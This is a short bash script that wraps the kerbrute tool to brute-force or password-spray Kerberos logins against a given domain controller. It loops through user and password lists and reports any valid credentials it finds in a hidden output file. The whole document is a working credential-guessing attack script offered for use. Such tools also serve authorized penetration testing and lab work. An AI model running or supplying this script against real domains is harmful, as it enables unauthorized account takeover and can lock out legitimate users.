#!/bin/bash
#
#The script runs kerbrute and sprays passwords one user at a time trying every password in the password file

outfile=".kerbruteOutput"
password_spraying=false

print_error_message(){
	echo "Usage: $0 (ip) (domain.local) (passwords.txt) (users.txt) [OPTIONS]"
        echo
        echo "A script used to bruteforce a list of users and passwords"
	echo
	echo "positional arguments:"
	echo
	echo "  show	Shows valid findings in the output file"
        echo
        echo "options:"
        echo "  -p, --password_first"
        echo "	Tries one password against each user then moves onto another password"
        echo "  -h, --help"
        echo "	Shows this error message and exits"
        exit 1
}


#if given the show argument it shows the progress by grepping the output file for "+"
if [ "$1" == 'show' ]; then
	touch $outfile
	if [ ! -s $outfile ]; then
		echo "Output file is empty!!"
		echo "Name : $outfile"
		exit 1
	fi
	grep "+" $outfile
	number=$(grep -c "+" "$outfile")
	case $number in
		0)
			echo "No valid findings!"
			;;
		1)
			echo "These is $number valid finding"
			;;
		*)
			echo "These are $number valid findings"
			;;
	esac
	exit 1
fi

if [[ $# -lt 4 ]]; then
	print_error_message
fi

while [[ $# -gt 0 ]]; do
	case "$1" in
		-h|--help)
			print_error_message
			;;
		-p|--password_first)
			password_spraying=true
			shift
			;;
		-*)
			print_error_message
			;;
		*)
			if [[ -z $2 || -z $3 || -z $4 ]]; then
				print_error_message
			fi
			ip=$1
			domain=$2
			passwords=$3
			users=$4
			shift 4
			;;
	esac
done

echo "Results may take a while"
echo "RUNNING..."
amount_of_findings=0
if $password_spraying; then
	#one password per line
	while IFS= read -r password; do
		kerbrute passwordspray --dc $ip -d $domain $users $password >> $outfile
		amount_of_findings=$(grep -c "+" $outfile)

		if [[ $amount_of_findings -eq 0 ]]; then
			continue
		fi
		grep "+" $outfile | sed -n ${amount_of_findings}p
	done < $passwords
else
	#one username per line 
	while IFS= read -r user; do
		kerbrute bruteuser --dc $ip -d $domain $passwords $user >> $outfile
		amount_of_findings=$(grep -c "+" $outfile)

		if [[ $amount_of_findings -eq 0 ]]; then
			continue
		fi
		grep "+" $outfile | sed -n ${amount_of_findings}p
	done < $users
fi



echo "Finished"
